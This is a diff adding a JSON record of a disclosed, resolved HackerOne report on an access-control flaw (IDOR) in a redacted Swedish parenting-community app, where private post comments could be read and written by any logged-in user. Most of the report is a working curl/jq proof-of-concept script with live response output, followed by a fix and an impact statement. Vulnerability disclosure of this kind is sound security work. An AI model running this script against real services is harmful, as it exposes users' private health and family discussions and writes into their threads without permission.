@@ -1,0 +1,114 @@
+{
+  "id": 4191937,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTkxOTM3",
+  "url": "https://hackerone.com/reports/4191937",
+  "title": "IDOR: private ████████ post comments can be read and written by any authenticated user",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-11-11T09:22:57.695Z",
+  "submitted_at": "2026-11-11T09:22:58.110Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "matty69v",
+    "url": "/matty69v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d9drin7bro3d44gr64nbpghu6pik/07cd666fba81a5fa22acb6ca51c9388fb3fc6282d31bb7100e43ac54f865f93e"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 109248,
+    "url": "https://hackerone.com/essity",
+    "handle": "essity",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/bcd838120b083f3e4634394be4e842b070658eb8ca2ee90ff88b1e7555d99fdf",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/3c93eb467513f5b14156ff4fede2c4636f707fb236b4ad7f308d529c1dd0b660"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Essity",
+      "twitter_handle": "",
+      "website": "http://essity.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-11-23T09:45:17.504Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-11-23T09:44:59.868Z",
+  "team_member_agreed_on_going_public_at": "2026-11-23T09:45:17.247Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\n████████ correctly returns `404` when account A requests another user's\n`readPrivacy=4` post through `/storypost`, but the same bearer token can retrieve\nthe private comments through `/getcomments` and insert comments through\n`/addcomment`.\n\nThis exposes private family/health discussions and lets unrelated users write\ninto “Only me” threads.\n\n## Full reproduction\n\nPrecondition: two unrelated ████████ accounts that completed normal onboarding,\nA and B. Account B has comments enabled and uses the most restrictive read setting:\n`readPrivacy=4` (`Bara jag/min partner`, Only me/my partner).\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nAPI='https://████████/████████-mobile/v1/ClubApp.ful/api'\nROOT=\"$API/v1\"\n\nA_EMAIL='attacker@example.test'\nA_PASSWORD='<A_PASSWORD>'\nB_EMAIL='victim@example.test'\nB_PASSWORD='<B_PASSWORD>'\n\nCOMMON=(\n  -H 'User-Agent: Mozilla/5.0 AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'\n  -H 'X-HackerOne-Research: matty69v'\n  -H 'Accept: */*'\n  -H 'Ocp-Apim-Subscription-Key: ████████'\n  -H 'X-MarketKey: ████████.se'\n  -H 'Content-Type: application/json'\n)\n\nA_BODY=$(jq -nc --arg e \"$A_EMAIL\" --arg p \"$A_PASSWORD\" \\\n  '{Email:$e,Password:$p}')\nB_BODY=$(jq -nc --arg e \"$B_EMAIL\" --arg p \"$B_PASSWORD\" \\\n  '{Email:$e,Password:$p}')\n\nA_LOGIN=$(curl -sS \"$ROOT/members/login\" \"${COMMON[@]}\" --data \"$A_BODY\")\nB_LOGIN=$(curl -sS \"$ROOT/members/login\" \"${COMMON[@]}\" --data \"$B_BODY\")\n\nA_TOKEN=$(printf '%s' \"$A_LOGIN\" | jq -r '.authentication.logintoken')\nB_TOKEN=$(printf '%s' \"$B_LOGIN\" | jq -r '.authentication.logintoken')\nB_FAMILY=$(printf '%s' \"$B_LOGIN\" | jq -r '.userDetails.familyDetails.familyId')\n\necho '[1] B sets Only me'\ncurl -sS -X POST \\\n  \"$API/v2/settings/setreadprivacysettings?familyId=$B_FAMILY&readPrivacy=4\" \\\n  \"${COMMON[@]}\" -H \"Authorization: Bearer $B_TOKEN\"\necho\n\necho '[2] B enables comments'\ncurl -sS -X POST \\\n  \"$ROOT/settings/setallowcommentsandlikes?familyId=$B_FAMILY&allowCommentsAndLikes=True\" \\\n  \"${COMMON[@]}\" -H \"Authorization: Bearer $B_TOKEN\"\necho\n\nDATE=$(date -u +'%Y-%m-%dT%H:%M:%SZ')\nPOST_BODY=$(jq -nc --arg d \"$DATE\" --argjson f \"$B_FAMILY\" \\\n  '{Text:\"matty69v-private-post-proof\",Subject:\"\",FamilyId:$f,TagUsers:[],MilestoneId:null,MilestoneFamilyMemberProfileId:null,Date:$d,StoryPostMedias:[]}')\nPOST=$(curl -sS \"$ROOT/addpost\" \"${COMMON[@]}\" \\\n  -H \"Authorization: Bearer $B_TOKEN\" --data \"$POST_BODY\")\nPOST_ID=$(printf '%s' \"$POST\" | jq -r '.internalMessage | capture(\"post (?<id>[0-9]+)\").id')\n\necho '[3] B creates the private post'\nprintf '%s\\n' \"$POST\"\n\necho '[4] B adds a private comment'\ncurl -sS -X POST \"$ROOT/addcomment?parentPostId=$POST_ID\" \"${COMMON[@]}\" \\\n  -H \"Authorization: Bearer $B_TOKEN\" \\\n  --data '{\"Comment\":\"matty69v-private-comment-B-proof\"}'\necho 'HTTP 200'\n\necho '[5] A cannot read the private post'\ncurl -sS -w '\\nHTTP %{http_code}\\n' \\\n  \"$ROOT/storypost?postId=$POST_ID\" \"${COMMON[@]}\" \\\n  -H \"Authorization: Bearer $A_TOKEN\"\n\necho '[6] A reads B private comment anyway'\ncurl -sS -w '\\nHTTP %{http_code}\\n' \\\n  \"$ROOT/getcomments?postId=$POST_ID\" \"${COMMON[@]}\" \\\n  -H \"Authorization: Bearer $A_TOKEN\"\n\necho '[7] A writes into B private post'\ncurl -sS -o /dev/null -w 'HTTP %{http_code}\\n' -X POST \\\n  \"$ROOT/addcomment?parentPostId=$POST_ID\" \"${COMMON[@]}\" \\\n  -H \"Authorization: Bearer $A_TOKEN\" \\\n  --data '{\"Comment\":\"matty69v-foreign-comment-A-proof\"}'\n\necho '[8] B sees A comment in the Only me thread'\ncurl -sS -w '\\nHTTP %{http_code}\\n' \\\n  \"$ROOT/getcomments?postId=$POST_ID\" \"${COMMON[@]}\" \\\n  -H \"Authorization: Bearer $B_TOKEN\"\n```\n\n## Observed JSON output\n\nExact result from the live test. Account A was `████████`; account B was\n`████████`; B's private post was `████████`.\n\n### B's privacy setting\n\n```json\n{\"availableReadPrivacies\":[{\"type\":1,\"name\":\"Alla i ████████klubben\"},{\"type\":4,\"name\":\"Bara jag/min partner\"},{\"type\":6,\"name\":\"Partner och vänner\"}],\"readPrivacy\":{\"type\":4,\"name\":\"Bara jag/min partner\"}}\n```\n\n### B creates the post\n\n```json\n{\"successcode\":0,\"statuscode\":200,\"errorMessage\":null,\"userMessage\":null,\"internalMessage\":\"Successfully created post ████████.\"}\n```\n\n### A cannot read the post\n\n```text\nHTTP 404\n{\"statuscode\":404,\"errorcode\":\"NotFoundException\",\"userMessage\":\"Fel lösenord eller mejladress\",\"internalMessage\":\"\\\"Post\\\" (████████) was not found.\"}\n```\n\n### A reads B's private comment\n\n```text\nHTTP 200\n[{\"storyId\":████████,\"storyType\":\"commentpost\",\"createDate\":\"2026-11-11T10:14:46.3239989\",\"postType\":1,\"parentPostId\":████████,\"author\":{\"id\":████████,\"imageUrl\":\"████████\",\"firstname\":\"matty69v-research\",\"lastname\":\"matty69v-research\"},\"text\":\"matty69v-private-comment-B-a099cb6e\"}]\n```\n\nResponse SHA-256:\n`████████`\n\n### Result summary\n\n```json\n{\n  \"post_owner\": ████████,\n  \"post_id\": ████████,\n  \"read_privacy\": \"Only me/my partner\",\n  \"A_read_post_status\": 404,\n  \"A_read_B_comment_status\": 200,\n  \"A_read_private_comment\": \"matty69v-private-comment-B-a099cb6e\",\n  \"A_wrote_foreign_comment_status\": 200,\n  \"A_foreign_comment\": \"matty69v-foreign-comment-A-1242f3ff\"\n}\n```\n\n### B sees A's unauthorized comment\n\n```text\nHTTP 200\n[{\"storyId\":████████,\"storyType\":\"commentpost\",\"createDate\":\"2026-11-11T10:14:46.3239989\",\"postType\":1,\"parentPostId\":████████,\"author\":{\"id\":████████,\"imageUrl\":\"████████\",\"firstname\":\"matty69v-research\",\"lastname\":\"matty69v-research\"},\"text\":\"matty69v-private-comment-B-a099cb6e\"},{\"storyId\":████████,\"storyType\":\"commentpost\",\"createDate\":\"2026-11-11T10:14:50.7369722\",\"postType\":1,\"parentPostId\":████████,\"author\":{\"id\":████████,\"imageUrl\":\"████████\",\"firstname\":\"matty69v-research\",\"lastname\":\"matty69v-research\"},\"text\":\"matty69v-foreign-comment-A-1242f3ff\"}]\n```\n\n\n\n## Fix\n\nAuthorize the parent post before reading or writing comments. `/getcomments`\nand `/addcomment` must use the same `canViewPost(currentUser, postId)` check as\n`/storypost`, and writes must additionally require comments to be enabled.\n\n## Impact\n\nAny authenticated ████████ user can obtain private comment text and commenter\nmetadata from posts they cannot access, and can inject comments into another\nuser's private thread. Because comments are part of a pregnancy/████████/family\ncommunity, they may contain sensitive health and child information.",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 1,
+  "voters": [
+    "matty69v"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 992203,
+    "asset_type": "URL",
+    "asset_identifier": "https://libero.se",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": [],
+    "can_view_ave_report?": false
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
